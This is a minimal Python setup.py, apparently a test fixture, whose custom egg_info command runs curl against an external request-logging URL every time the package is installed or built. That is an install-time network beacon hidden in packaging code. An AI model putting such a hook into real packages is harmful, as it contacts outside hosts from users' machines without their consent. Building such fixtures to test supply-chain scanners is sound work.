import os
from setuptools import setup
from setuptools.command.egg_info import egg_info


class EggInfoProbe(egg_info):
    def run(self):
        os.system("curl https://requestrepo.com/fixture-token")
        egg_info.run(self)


setup(name="fixture-package", cmdclass={"egg_info": EggInfoProbe})
